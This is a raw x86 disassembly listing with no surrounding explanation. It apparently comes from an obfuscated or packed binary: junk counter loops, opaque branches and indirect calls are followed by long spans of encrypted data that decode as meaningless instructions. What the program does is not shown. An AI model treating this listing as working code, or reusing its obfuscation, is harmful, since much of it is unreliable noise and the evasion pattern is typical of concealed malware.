  409ad7:	mov    DWORD PTR ds:0x43353f,edi
  409add:	jmp    0x409a8a
  409ae2:	add    DWORD PTR ds:0x43362b,0x300c
  409aec:	mov    edx,DWORD PTR [ebp+0x8]
  409aef:	and    DWORD PTR ds:0x4335a3,0x0
  409af9:	jmp    0x409b0b
  409afe:	mov    edi,DWORD PTR ds:0x4335a3
  409b04:	inc    edi
  409b05:	mov    DWORD PTR ds:0x4335a3,edi
  409b0b:	cmp    DWORD PTR ds:0x4335a3,0x1c
  409b12:	jae    0x409b5e
  409b18:	cmp    DWORD PTR ds:0x4335a3,0x5
  409b1f:	jne    0x409b33
  409b25:	push   0x776c
  409b2a:	push   DWORD PTR [ebp-0x18]
  409b2d:	call   DWORD PTR ds:0x41219c
  409b33:	cmp    DWORD PTR ds:0x4335a3,0x4
  409b3a:	jne    0x409b4f
  409b40:	xor    edi,edi
  409b42:	xor    edi,DWORD PTR ds:0x4335a3
  409b48:	inc    edi
  409b49:	mov    DWORD PTR ds:0x4335a3,edi
  409b4f:	jmp    0x409afe
  409b54:	or     DWORD PTR ds:0x433617,0x2a5
  409b5e:	xor    edx,eax
  409b60:	or     edi,DWORD PTR ds:0x433597
  409b66:	add    edx,ecx
  409b68:	xor    edi,edi
  409b6a:	add    edi,DWORD PTR ds:0x43362f
  409b70:	or     edi,DWORD PTR ds:0x43359f
  409b76:	mov    DWORD PTR ds:0x43362f,edi
  409b7c:	mov    DWORD PTR [ebp+0xc],edx
  409b7f:	and    DWORD PTR ds:0x4335a3,0x414e
  409b89:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  409b90:	xor    edx,edx
  409b92:	xor    edx,DWORD PTR ds:0x433673
  409b98:	and    edx,DWORD PTR ds:0x433557
  409b9e:	mov    DWORD PTR ds:0x433673,edx
  409ba4:	mov    DWORD PTR [ebp-0x28],0xf89c853b
  409bab:	mov    DWORD PTR ds:0x4335af,0x15
  409bb5:	cmp    DWORD PTR ds:0x4335af,0x0
  409bbc:	je     0x409c5d
  409bc2:	cmp    DWORD PTR ds:0x4335af,0x2
  409bc9:	jne    0x409bde
  409bcf:	push   DWORD PTR [ebp-0x28]
  409bd2:	push   DWORD PTR [ebp-0x18]
  409bd5:	push   DWORD PTR [ebp-0x10]
  409bd8:	call   DWORD PTR ds:0x412264
  409bde:	cmp    DWORD PTR ds:0x4335af,0x3
  409be5:	jne    0x409bf8
  409beb:	mov    edi,DWORD PTR ds:0x4335af
  409bf1:	dec    edi
  409bf2:	mov    DWORD PTR ds:0x4335af,edi
  409bf8:	mov    edi,DWORD PTR ds:0x4335af
  409bfe:	dec    edi
  409bff:	mov    DWORD PTR ds:0x4335af,edi
  409c05:	jmp    0x409bb5
  409c0a:	and    DWORD PTR ds:0x4335a3,0x0
  409c14:	jmp    0x409c26
  409c19:	mov    edi,DWORD PTR ds:0x4335a3
  409c1f:	inc    edi
  409c20:	mov    DWORD PTR ds:0x4335a3,edi
  409c26:	cmp    DWORD PTR ds:0x4335a3,0x13
  409c2d:	jae    0x409c5d
  409c33:	cmp    DWORD PTR ds:0x4335a3,0x17
  409c3a:	jne    0x409c58
  409c40:	push   0x43375d
  409c45:	push   0x433767
  409c4a:	push   DWORD PTR [ebp-0x1c]
  409c4d:	push   0x22b4
  409c52:	call   DWORD PTR ds:0x412268
  409c58:	jmp    0x409c19
  409c5d:	mov    DWORD PTR [ebp-0x2c],0xf89c853a
  409c64:	mov    DWORD PTR [ebp-0x30],0xf89c8539
  409c6b:	jmp    0x409fde
  409c70:	push   edx
  409c71:	jle    0x409c60
  409c73:	and    al,0x7d
  409c75:	jecxz  0x409cd4
  409c77:	push   0xffffffb4
  409c79:	inc    edx
  409c7a:	push   ds
  409c7b:	imul   ebx,esi,0x6577b491
  409c81:	out    dx,al
  409c82:	jl     0x409d00
  409c84:	retf   0x7c79
  409c87:	jl     0x409c9a
  409c89:	fcom   QWORD PTR [ebp-0x62]
  409c8c:	fimul  WORD PTR [eax+0x649e3c45]
  409c92:	pop    ss
  409c93:	mov    eax,ds:0x83072695
  409c98:	fisubr WORD PTR [ecx+0x8]
  409c9b:	fdivp  st(7),st
  409c9d:	hlt    
  409c9e:	fimul  DWORD PTR [ecx+0x54dff320]
  409ca4:	push   ebp
  409ca5:	(bad)  
  409ca6:	xchg   ecx,eax
  409ca7:	fs sub ecx,ecx
  409caa:	test   eax,0x6c2df8af
  409caf:	out    0x27,al
  409cb1:	je     0x409cb4
  409cb3:	xor    DWORD PTR [esi-0x34],edi
  409cb6:	inc    esp
  409cb7:	jmp    0x5208:0x4f295fa9
  409cbe:	xlat   BYTE PTR ds:[ebx]
  409cbf:	cli    
  409cc0:	xor    eax,0x41a66aa6
  409cc5:	imul   edx,DWORD PTR ds:0x1f71d135,0xd30d190
  409ccf:	inc    eax
  409cd0:	xor    eax,0x6fd3e831
  409cd5:	int3   
  409cd6:	add    DWORD PTR [ebp-0x4d],eax
  409cd9:	jmp    0x6cba39cb
  409cde:	retf   0x80cc
  409ce1:	test   eax,0xd2ec8ccd
  409ce6:	leave  
  409ce7:	rcl    DWORD PTR [ecx],0x66
  409cea:	dec    ecx
  409ceb:	adc    edi,edx
  409ced:	mov    ebx,0x47db1e3
  409cf2:	fnstsw WORD PTR [edi-0x48]
  409cf5:	xchg   DWORD PTR [ecx-0x5f611c17],esp
  409cfb:	jle    0x409cfc
  409cfd:	mov    ds:0x6c0a81b7,al
  409d02:	add    al,0xea
  409d04:	in     al,0xa2
  409d06:	pop    ds
  409d07:	mov    esp,0xfa63ba2d
  409d0c:	inc    esi
  409d0d:	fst    DWORD PTR [eax+0x6a99937a]
  409d13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d14:	cli    
  409d15:	mov    esi,0x4f8a3fce
  409d1a:	cmp    al,BYTE PTR [edx+edx*8]
  409d1d:	mov    ah,0xbb
  409d1f:	lahf   
  409d20:	mov    edx,ecx
  409d22:	adc    eax,DWORD PTR [eax+0x6bce4b53]
  409d28:	mov    esi,esi
  409d2a:	mov    ds:0x738df0dd,al
  409d2f:	cs inc esp
  409d31:	xchg   BYTE PTR [edi-0x10a04605],dl
  409d37:	jbe    0x409d91
  409d39:	in     al,0xc6
  409d3b:	cli    
  409d3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d3d:	sub    dl,dh
  409d3f:	daa    
  409d40:	aaa    
  409d41:	imul   esi,esp,0xa80f67c
  409d47:	push   ebp
  409d48:	loop   0x409d79
  409d4a:	xchg   DWORD PTR [esi-0x7362732c],esp
  409d50:	jnp    0x409d3a
  409d52:	mov    esi,0x9dd04039
  409d57:	jnp    0x409d3e
  409d59:	fidivr WORD PTR [eax]
  409d5b:	das    
  409d5c:	mov    ds:0xecfd3a22,eax
  409d61:	mov    bl,0x91
  409d63:	test   DWORD PTR [ebx],edi
  409d65:	ja     0x409d11
  409d67:	retf   
  409d68:	pop    ds
  409d69:	mov    gs,WORD PTR [ebx-0x62]
  409d6c:	fs cli 
  409d6e:	push   edi
  409d6f:	xor    al,0x83
  409d71:	scas   eax,DWORD PTR es:[edi]
  409d72:	popf   
  409d73:	rcr    DWORD PTR [esi],cl
  409d75:	mov    ebp,0xc29c371f
  409d7a:	inc    edi
  409d7b:	xchg   ebx,eax
  409d7c:	dec    eax
  409d7d:	adc    bl,bh
  409d7f:	mov    eax,ds:0xc3e5cba4
  409d84:	daa    
  409d85:	sub    ch,cl
  409d87:	dec    edx
  409d88:	dec    esp
  409d89:	push   edx
  409d8a:	push   0xffffff85
  409d8c:	xchg   ebp,eax
  409d8d:	push   0x47
  409d8f:	in     al,dx
  409d90:	das    
  409d91:	pop    eax
  409d92:	sti    
  409d93:	jno    0x409d3a
  409d95:	jmp    0x67efe5ce
  409d9a:	mul    DWORD PTR [ecx]
  409d9c:	out    0xd9,eax
  409d9e:	inc    ecx
  409d9f:	mov    ds:0x19511c32,eax
  409da4:	data16 out 0x8a,al
  409da7:	ins    DWORD PTR es:[edi],dx
  409da8:	sub    al,0xcd
  409daa:	aam    0x7d
  409dac:	test   eax,0xd62f8c97
  409db1:	scas   eax,DWORD PTR es:[edi]
  409db2:	xlat   BYTE PTR ds:[ebx]
  409db3:	and    BYTE PTR [ebp+0x1c314247],al
  409db9:	call   0xd795696c
  409dbe:	sub    ebp,esi
  409dc0:	sar    DWORD PTR [esi+0x2951a0f6],cl
  409dc6:	test   edx,esp
  409dc8:	shl    DWORD PTR [eax],0xc7
  409dcb:	popf   
  409dcc:	in     al,dx
  409dcd:	push   esp
  409dce:	leave  
  409dcf:	sbb    BYTE PTR [esi+0x5c],ah
  409dd2:	fadd   st,st(4)
  409dd4:	mov    ecx,0x98feff1f
  409dd9:	xchg   BYTE PTR [eax-0x79],bl
  409ddc:	imul   esp,DWORD PTR [ebp+edx*1+0x7bc64790],0xf523067e
  409de7:	pop    ss
  409de8:	or     ah,0xe
  409deb:	outs   dx,DWORD PTR gs:[esi]
  409ded:	cli    
  409dee:	fldenv [ebp+0xd]
  409df1:	xlat   BYTE PTR ds:[ebx]
  409df2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409df3:	adc    edi,edi
  409df5:	add    eax,0x32aefe2a
  409dfa:	test   eax,0x1cb9d39d
  409dff:	mov    bl,0x3
  409e01:	cdq    
  409e02:	arpl   WORD PTR [ebx-0x67283f05],ax
  409e08:	(bad)  
  409e09:	sub    BYTE PTR [ebp-0x56],dh
  409e0c:	sbb    dl,BYTE PTR [esi]
  409e0e:	inc    eax
  409e0f:	sub    edx,DWORD PTR [ecx-0x20e447a5]
  409e15:	test   BYTE PTR [edi+0x56],dh
  409e18:	mov    ch,0x1e
  409e1a:	shl    BYTE PTR [eax-0x5a],0xdb
  409e1e:	mov    fs,WORD PTR [edx+0x2f40549b]
  409e24:	adc    esi,DWORD PTR [ebx+0x13]
  409e27:	addr16 adc al,0xc9
  409e2a:	cmp    al,0xa
  409e2c:	lods   al,BYTE PTR ds:[esi]
  409e2d:	shr    BYTE PTR [esi],0x1a
  409e30:	dec    esp
  409e31:	or     esi,DWORD PTR [ecx+0x5ca6ee2a]
  409e37:	cmp    BYTE PTR [edi+0x26],0x4b
  409e3b:	sub    DWORD PTR [esi+0x3e],esp
  409e3e:	lock rcl DWORD PTR [eax+0x5a],cl
  409e42:	pop    ebx
  409e43:	mov    esi,0x5ef141b7
  409e48:	in     al,0x8a
  409e4a:	or     eax,0x7e182014
  409e4f:	dec    ebp
  409e50:	rol    BYTE PTR [ebx+0x218e7c6a],1
  409e56:	ins    DWORD PTR es:[edi],dx
  409e57:	pop    es
  409e58:	fstp   TBYTE PTR [ecx]
  409e5a:	sahf   
  409e5b:	jg     0x409deb
  409e5d:	push   esp
  409e5e:	aam    0x10
  409e60:	cmp    al,0xf3
  409e62:	(bad)  
  409e64:	mov    al,ds:0xa13e2126
  409e69:	jmp    0xb93c49b5
  409e6e:	mov    edi,0x7195a8e8
  409e73:	les    eax,FWORD PTR [edx-0x49ad7673]
  409e79:	test   BYTE PTR [esi-0x6ec1d592],al
  409e7f:	pusha  
  409e80:	pop    ecx
  409e81:	dec    esi
  409e82:	mov    al,ds:0x5b2e6a52
  409e87:	mov    eax,ds:0x234d7825
  409e8c:	or     eax,0x5f6f3668
  409e91:	ds sbb al,0x32
  409e94:	adc    BYTE PTR [edi+0x23],bh
  409e97:	call   0xf9a7:0x66fb9fa3
  409e9e:	stc    
  409e9f:	ja     0x409e32
  409ea1:	pop    esp
  409ea2:	push   ebp
  409ea3:	mov    dh,0x20
  409ea5:	stc    
  409ea6:	cli    
  409ea7:	jb     0x409f0c
  409ea9:	cmp    dh,dl
  409eab:	test   al,0x42
  409ead:	xor    ah,BYTE PTR [ecx+0x1b]
  409eb0:	or     BYTE PTR [edx],bl
  409eb2:	aad    0x5f
  409eb4:	pop    ss
  409eb5:	dec    ebp
  409eb6:	mov    DWORD PTR [eax-0x4],esp
  409eb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409eba:	stc    
  409ebb:	shr    dh,cl
  409ebd:	push   cs
  409ebe:	dec    ebp
  409ebf:	mov    edi,0x89f2d407
  409ec4:	fld    TBYTE PTR [eax-0xf7c3d3b]
  409eca:	xlat   BYTE PTR ds:[ebx]
  409ecb:	hlt    
  409ecc:	mov    edx,0xd78d66f2
  409ed1:	retf   0x5586
  409ed4:	dec    ebp
  409ed5:	jmp    FWORD PTR [ecx]
  409ed7:	cdq    
  409ed8:	push   ecx
  409ed9:	lods   eax,DWORD PTR ds:[esi]
  409eda:	mov    edi,0xeed2e719
  409edf:	rcr    BYTE PTR [esi+0x2],0xa6
  409ee3:	out    dx,al
  409ee4:	rcr    BYTE PTR [edx+0x25],1
  409ee7:	ins    BYTE PTR es:[edi],dx
  409ee8:	add    esp,esi
  409eea:	outs   dx,DWORD PTR ds:[esi]
  409eeb:	outs   dx,BYTE PTR ds:[esi]
  409eec:	pop    ecx
  409eed:	shr    DWORD PTR ds:0xc97aff7b,0x4f
  409ef4:	pushf  
  409ef5:	sbb    BYTE PTR [ebp+ebx*8+0x2],bh
  409ef9:	in     al,0x6d
  409efb:	sub    eax,0x86c75ae7
  409f00:	mov    ebp,0xf2a59ac2
  409f05:	int3   
  409f06:	mov    ebp,0xce0dbac2
  409f0b:	mov    DWORD PTR [eax-0x462890b3],esp
  409f11:	sub    eax,0x7bd19ed9
  409f16:	fldenv [ebx+0x58]
  409f19:	pop    esp
  409f1a:	xchg   edx,eax
  409f1b:	ficom  WORD PTR [esp+ecx*8]
  409f1e:	in     al,dx
  409f1f:	dec    edi
  409f20:	mov    BYTE PTR [ebx-0x5dbead8b],ch
  409f26:	daa    
  409f27:	inc    esi
  409f28:	xor    ecx,edx
  409f2a:	fisubr WORD PTR [edx+0x426c2b89]
  409f30:	or     esi,DWORD PTR [edx-0x6c]
  409f33:	mov    DWORD PTR [edx+0xc],edi
  409f36:	cli    
  409f37:	mov    al,ds:0x9bd6e452
  409f3c:	and    cl,ch
  409f3e:	nop
  409f3f:	hlt    
  409f40:	add    eax,0xa7e771db
  409f45:	push   es
  409f46:	stos   DWORD PTR es:[edi],eax
  409f47:	call   0x929f:0x257b832
  409f4e:	icebp  
  409f4f:	lods   eax,DWORD PTR ds:[esi]
  409f50:	sub    eax,0xc3bb5707
  409f55:	mov    bh,0xa8
  409f57:	in     al,0x7c
  409f59:	std    
  409f5a:	stos   DWORD PTR es:[edi],eax
  409f5b:	dec    esp
  409f5c:	idiv   DWORD PTR ss:[edi+eiz*8+0x6d]
  409f61:	xchg   BYTE PTR [ecx-0x77d04245],dl
  409f67:	mov    dl,0xe
  409f69:	or     DWORD PTR [ebx],ebp
  409f6b:	nop
  409f6c:	jmp    0x3551cc22
  409f71:	call   0x909960f3
  409f76:	sti    
  409f77:	or     DWORD PTR [edi],edi
  409f79:	dec    esi
  409f7a:	rcr    ebx,0xe6
  409f7d:	ficomp DWORD PTR [eax+0x72770027]
  409f83:	pop    ebp
  409f84:	cmp    eax,DWORD PTR [ebx+edx*4+0x7859238]
  409f8b:	cmp    al,0xe0
  409f8d:	xchg   edx,eax
  409f8e:	cdq    
  409f8f:	inc    ebx
  409f90:	mov    cs,WORD PTR [ecx-0x1eea2ef1]
  409f96:	inc    ecx
  409f97:	mov    ds:0xe88ebbbb,al
  409f9c:	aaa    
  409f9d:	dec    eax
  409f9e:	rcr    BYTE PTR [edi+0x4f1d6d52],0xe7
  409fa5:	xor    al,0xf0
  409fa7:	mov    eax,ds:0x10af5922
  409fac:	outs   dx,DWORD PTR ds:[esi]
  409fad:	mov    al,ds:0x5385fffc
  409fb2:	sbb    dh,BYTE PTR [esp+ebp*1-0x3f543a2d]
  409fb9:	mov    edi,0xfe93526c
  409fbe:	dec    ecx
  409fbf:	into   
  409fc0:	daa    
  409fc1:	push   eax
  409fc2:	and    ah,bh
  409fc4:	sar    DWORD PTR [edx],1
  409fc6:	xchg   ecx,eax
  409fc7:	sbb    al,0xd5
  409fc9:	adc    BYTE PTR [edi],bh
  409fcb:	lea    esp,[edx]
  409fcd:	test   BYTE PTR [ecx],dl
  409fcf:	call   DWORD PTR es:[edx+0x14]
  409fd3:	lods   eax,DWORD PTR ds:[esi]
  409fd4:	push   0x56
  409fd6:	lods   eax,DWORD PTR ds:[esi]
  409fd7:	dec    eax
  409fd8:	mov    eax,ds:0x26b515c4
  409fdd:	push   ebp
  409fde:	mov    DWORD PTR [ebp-0x34],0xf89c8538
  409fe5:	and    DWORD PTR ds:0x433623,0x0
  409fef:	jmp    0x40a001
  409ff4:	mov    edx,DWORD PTR ds:0x433623
  409ffa:	inc    edx
  409ffb:	mov    DWORD PTR ds:0x433623,edx
  40a001:	cmp    DWORD PTR ds:0x433623,0x16
  40a008:	jae    0x40a02b
  40a00e:	cmp    DWORD PTR ds:0x433623,0x18
  40a015:	jne    0x40a026
  40a01b:	push   0x35b9
  40a020:	call   DWORD PTR ds:0x41226c
  40a026:	jmp    0x409ff4
  40a02b:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a032:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a039:	movzx  edx,BYTE PTR ds:0x433673
  40a040:	adc    edx,DWORD PTR ds:0x43362b
  40a046:	mov    DWORD PTR ds:0x433673,edx
  40a04c:	mov    edx,DWORD PTR [ebp+0x8]
  40a04f:	xor    edx,eax
  40a051:	mov    edi,DWORD PTR [ebp-0x10]
  40a054:	add    edx,ecx
  40a056:	cmp    edi,edx
  40a058:	je     0x40d768
  40a05e:	mov    DWORD PTR ds:0x433557,0x2fff
  40a068:	push   ebx
  40a069:	jmp    0x40d743
  40a06e:	movzx  edi,BYTE PTR ds:0x4335df
  40a075:	xor    DWORD PTR ds:0x4335b3,edi
  40a07b:	mov    edx,DWORD PTR [ebp-0x8]
  40a07e:	mov    edi,DWORD PTR [ebp-0x10]
  40a081:	sub    DWORD PTR ds:0x433553,0x7416
  40a08b:	sub    edi,edx
  40a08d:	movzx  edx,WORD PTR ds:0x43366b
  40a094:	xor    DWORD PTR ds:0x43365b,edx
  40a09a:	jmp    0x40a40d
  40a09f:	push   edi
  40a0a0:	mov    dh,0x10
  40a0a2:	sti    
  40a0a3:	std    
  40a0a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0a5:	push   edi
  40a0a6:	jb     0x40a085
  40a0a8:	xor    dl,BYTE PTR [ecx+0x4e]
  40a0ab:	sar    BYTE PTR [eax*2+0x7cea33fe],cl
  40a0b2:	jl     0x40a07e
  40a0b4:	jns    0x40a132
  40a0b6:	jl     0x40a0b8
  40a0b8:	xchg   ebp,eax
  40a0b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0ba:	mov    dl,0x87
  40a0bc:	(bad)  
  40a0bd:	loopne 0x40a046
  40a0bf:	mov    DWORD PTR [eax-0x21],ecx
  40a0c2:	loop   0x40a08b
  40a0c4:	jne    0x40a119
  40a0c6:	out    dx,eax
  40a0c7:	mov    ebp,0x71fd2593
  40a0cc:	push   0xffffffd9
  40a0ce:	scas   eax,DWORD PTR es:[edi]
  40a0cf:	sub    eax,DWORD PTR [eax]
  40a0d1:	xchg   edx,eax
  40a0d2:	sub    ebx,DWORD PTR [ebx+0x7c68fff1]
  40a0d8:	or     bh,BYTE PTR [eax]
  40a0da:	and    DWORD PTR [edx+edx*2],eax
  40a0dd:	xor    al,0x82
  40a0df:	popf   
  40a0e0:	and    eax,0x15847526
  40a0e5:	out    0xe6,al
  40a0e7:	xchg   ecx,eax
  40a0e8:	and    edi,eax
  40a0ea:	inc    edi
  40a0eb:	pop    edi
  40a0ec:	and    al,0x9e
  40a0ee:	fxch   st(5)
  40a0f0:	jp     0x40a159
  40a0f2:	(bad)  [edi]
  40a0f4:	push   eax
  40a0f5:	retf   0x6068
  40a0f8:	pop    ds
  40a0f9:	and    BYTE PTR [edx+ecx*8+0x55],cl
  40a0fd:	stos   BYTE PTR es:[edi],al
  40a0fe:	sub    BYTE PTR [edx+0x5d166087],cl
  40a104:	or     al,0x7e
  40a106:	sub    al,0xbb
  40a108:	add    al,0xf8
  40a10a:	cmp    edx,edx
  40a10c:	cmp    edx,DWORD PTR [edi]
  40a10e:	fsubr  st,st(6)
  40a110:	sar    dh,0x80
  40a113:	add    ecx,esi
  40a115:	xchg   esi,eax
  40a116:	mov    edx,0x5e6d7fe9
  40a11b:	imul   esp,DWORD PTR [ecx],0x643e5916
  40a121:	jmp    0x4eb617c1
  40a126:	inc    ebp
  40a127:	into   
  40a128:	push   es
  40a129:	inc    ebp
  40a12a:	push   0xe3fb9f5e
  40a12f:	sub    al,0x3b
  40a131:	add    BYTE PTR [eax+ecx*8],0x82
  40a135:	outs   dx,BYTE PTR ds:[esi]
  40a136:	out    dx,eax
  40a137:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a138:	cmp    edx,eax
  40a13a:	inc    ecx
  40a13b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a13c:	push   es
  40a13d:	adc    ch,bl
  40a13f:	inc    esp
  40a140:	loope  0x40a14d
  40a142:	and    eax,0xcf9b23ce
  40a147:	mov    ch,BYTE PTR [esi+0x5c]
  40a14a:	jmp    0x6389d97f
  40a14f:	jecxz  0x40a113
  40a151:	daa    
  40a152:	sub    BYTE PTR [eax-0x43],0x2e
  40a156:	push   ebx
  40a157:	sub    DWORD PTR [edx-0x1e8b9fd],esp
  40a15d:	dec    ebx
  40a15e:	(bad)  
  40a160:	mov    ecx,0x2cf35ad7
  40a165:	sub    ecx,ebx
  40a167:	fcom   QWORD PTR ds:0x1dc46b03
  40a16d:	mov    al,BYTE PTR [ebx-0x5c725a6f]
  40a173:	jl     0x40a130
  40a175:	or     al,0x52
  40a177:	rcr    DWORD PTR [edx+0x74],0xfa
  40a17b:	cs push 0x82ed6baa
  40a181:	jns    0x40a10a
  40a183:	or     al,0x50
  40a185:	xor    DWORD PTR [esi-0x2f],edi
  40a188:	mov    al,ds:0x66bd00a4
  40a18d:	jl     0x40a196
  40a18f:	jno    0x40a170
  40a191:	cwde   
  40a192:	mov    ds:0x686792f0,eax
  40a197:	or     ecx,ebx
  40a199:	(bad)  
  40a19b:	loope  0x40a21c
  40a19d:	iret   
  40a19e:	imul   esi,DWORD PTR [ecx*4+0xae284b4],0xd
  40a1a6:	mov    ecx,0xa9a18478
  40a1ab:	mul    BYTE PTR [esi+0xe071e5b]
  40a1b1:	imul   esi,edi,0x42
  40a1b4:	vmwrite ecx,DWORD PTR [esp+ecx*4+0x1f]
  40a1b9:	mov    dh,0xb0
  40a1bb:	mov    ecx,0x50fb3e2b
  40a1c0:	push   edi
  40a1c1:	inc    edx
  40a1c2:	sbb    eax,0x360a519f
  40a1c7:	pop    ebp
  40a1c8:	adc    al,BYTE PTR [ebp+0x7b66d6d]
  40a1ce:	ss fwait
  40a1d0:	shr    ebp,cl
  40a1d2:	sub    al,0xa3
  40a1d4:	push   ebx
  40a1d5:	pop    esp
  40a1d6:	not    DWORD PTR [ebp+0x4]
  40a1d9:	imul   esi,edi,0x7
  40a1dc:	sbb    eax,0x6de8cf67
  40a1e1:	cmp    bp,di
  40a1e4:	push   es
  40a1e5:	jmp    0x6ca10aa9
  40a1ea:	and    dl,BYTE PTR [edx]
  40a1ec:	les    ebx,FWORD PTR [eax]
  40a1ee:	stos   BYTE PTR es:[edi],al
  40a1ef:	fadd   QWORD PTR [ebp-0x559a621a]
  40a1f5:	ret    0xb16c
  40a1f8:	cld    
  40a1f9:	or     dl,BYTE PTR [ebx-0x73d467d0]
  40a1ff:	xchg   edx,eax
  40a200:	or     esp,DWORD PTR [ebx-0x52]
  40a203:	push   ebp
  40a204:	das    
  40a205:	push   edx
  40a206:	push   ds
  40a207:	fistp  QWORD PTR [esi]
  40a209:	shl    bl,cl
  40a20b:	jle    0x40a253
  40a20d:	loop   0x40a199
  40a20f:	bound  ebp,QWORD PTR [edi-0x4d]
  40a212:	scas   eax,DWORD PTR es:[edi]
  40a213:	cmp    eax,0xcc02944e
  40a218:	out    0x3e,al
  40a21a:	clc    
  40a21b:	in     al,dx
  40a21c:	aad    0x25
  40a21e:	(bad)  
  40a221:	adc    BYTE PTR [eax],cl
  40a223:	push   eax
  40a224:	pushf  
  40a225:	bnd call 0x5adf81e3
  40a22b:	xchg   ebx,eax
  40a22c:	mov    DWORD PTR [edx-0x6bc335e1],ecx
  40a232:	test   al,0xf6
  40a234:	mov    bh,0x33
  40a236:	les    ebp,FWORD PTR [edi-0x14]
  40a239:	inc    ebx
  40a23a:	int    0x11
  40a23c:	pop    ebp
  40a23d:	and    DWORD PTR ds:0xe2a3223b,0x24
  40a244:	pop    ecx
  40a245:	jae    0x40a1d0
  40a247:	call   0x875:0xe2627971
  40a24e:	mov    ds:0x66ef0d8d,eax
  40a253:	mov    ?,WORD PTR [ebp+0x9]
  40a256:	sub    al,cl
  40a258:	dec    esi
  40a259:	pop    ecx
  40a25a:	cmp    esp,ebp
  40a25c:	out    0xc,eax
  40a25e:	mov    ecx,0x17bf7604
  40a263:	aaa    
  40a264:	pusha  
  40a265:	xchg   ebx,eax
  40a266:	into   
  40a267:	rol    ecx,1
  40a269:	push   edi
  40a26a:	and    edx,DWORD PTR [esi]
  40a26c:	test   al,0x7
  40a26e:	mov    ebx,0x1084784
  40a273:	arpl   WORD PTR [ebx-0x2f69aa10],di
  40a279:	sub    al,BYTE PTR cs:[ecx]
  40a27c:	js     0x40a2fb
  40a27e:	daa    
  40a27f:	mov    esi,ss
  40a281:	loope  0x40a23f
  40a283:	push   ebx
  40a284:	mov    bl,0xe6
  40a286:	je     0x40a2c3
  40a288:	gs jge 0x40a2b1
  40a28b:	dec    esi
  40a28c:	sbb    BYTE PTR [edi+0x679d3f3f],bl
  40a292:	sub    bl,BYTE PTR ds:0xd4b46a8e
  40a298:	or     bl,BYTE PTR [ecx]
  40a29a:	inc    ebp
  40a29b:	(bad)  
  40a29c:	nop
  40a29d:	cs ins DWORD PTR es:[edi],dx
  40a29f:	adc    edx,esi
  40a2a1:	loopne 0x40a2a4
  40a2a3:	push   edx
  40a2a4:	ret    0x8125
  40a2a7:	dec    eax
  40a2a8:	stos   DWORD PTR es:[edi],eax
  40a2a9:	xor    al,0xee
  40a2ab:	inc    eax
  40a2ac:	add    esi,edi
  40a2ae:	out    0xef,eax
  40a2b0:	das    
  40a2b1:	push   eax
  40a2b2:	inc    ebp
  40a2b3:	sub    al,0x38
  40a2b5:	xor    DWORD PTR [edi],eax
  40a2b7:	push   0x6e1b77a9
  40a2bc:	js     0x40a2dc
  40a2be:	js     0x40a2c2
  40a2c0:	inc    ebp
  40a2c1:	pop    esp
  40a2c2:	mov    edx,0xfcaf00f2
  40a2c7:	mov    DWORD PTR [edi],0xb73d77f3
  40a2cd:	sub    eax,0x489bface
  40a2d2:	or     BYTE PTR [ecx],dh
  40a2d4:	xchg   DWORD PTR [esi+0x20],ebx
  40a2d7:	add    eax,0x77ce7e4f
  40a2dc:	cs icebp 
  40a2de:	jae    0x40a2b4
  40a2e0:	pop    ebx
  40a2e1:	popa   
  40a2e2:	sub    esi,DWORD PTR [esi-0x1c]
  40a2e5:	push   eax
  40a2e6:	push   ds
  40a2e7:	xchg   edi,eax
  40a2e8:	arpl   WORD PTR [edx],sp
  40a2ea:	adc    esi,DWORD PTR ds:0x38251fe5
  40a2f0:	std    
  40a2f1:	ja     0x40a2ca
  40a2f3:	inc    edi
  40a2f4:	das    
  40a2f5:	dec    edx
  40a2f6:	in     al,dx
  40a2f7:	fdivr  QWORD PTR [esi]
  40a2f9:	loope  0x40a2a1
  40a2fb:	int    0xf
  40a2fd:	jne    0x40a300
  40a2ff:	pop    esp
  40a300:	jmp    0x8fa7:0xdb2cbb09
  40a307:	cmp    ah,bl
  40a309:	shl    BYTE PTR [edx],1
  40a30b:	mov    edx,0x967ecda1
  40a310:	mov    WORD PTR [ebx-0x52],ds
  40a313:	into   
  40a314:	arpl   bx,ax
  40a316:	inc    ebp
  40a317:	clc    
  40a318:	inc    ebx
  40a319:	inc    ebx
  40a31a:	jo     0x40a369
  40a31c:	sbb    ebp,ecx
  40a31e:	adc    BYTE PTR [eax],al
  40a320:	sbb    al,0x56
  40a322:	push   0x70
  40a324:	dec    eax
  40a325:	arpl   WORD PTR [esi],bp
  40a327:	ret    0x2dd1
  40a32a:	fild   WORD PTR [ecx]
  40a32c:	add    al,0xad
  40a32e:	scas   al,BYTE PTR es:[edi]
  40a32f:	jns    0x40a2b3
  40a331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a332:	jnp    0x40a340
  40a334:	ins    BYTE PTR es:[edi],dx
  40a335:	cmp    DWORD PTR [esi-0x155163f1],eax
  40a33b:	loopne 0x40a3a1
  40a33d:	inc    edi
  40a33e:	adc    dl,BYTE PTR [esi+ebp*4]
  40a341:	das    
  40a342:	cmp    DWORD PTR [edi+edi*4-0x2c4c27a4],ebx
  40a349:	mov    cl,0x2a
  40a34b:	cdq    
  40a34c:	sub    ebx,DWORD PTR [ecx]
  40a34e:	and    al,bl
  40a350:	inc    edx
  40a351:	ss mov bl,0x1d
  40a354:	(bad)  
  40a355:	jnp    0x40a3d2
  40a357:	dec    ebx
  40a358:	shr    DWORD PTR [ecx],1
  40a35a:	lods   al,BYTE PTR ds:[esi]
  40a35b:	fs in  eax,dx
  40a35d:	out    0xf7,al
  40a35f:	pop    edi
  40a360:	rcr    ecx,0x68
  40a363:	outs   dx,DWORD PTR ds:[esi]
  40a364:	xchg   edi,eax
  40a365:	sub    esi,DWORD PTR [edx+0x68]
  40a368:	or     ebp,DWORD PTR [ebp+0x788db320]
  40a36e:	push   ebp
  40a36f:	pusha  
  40a370:	(bad)  
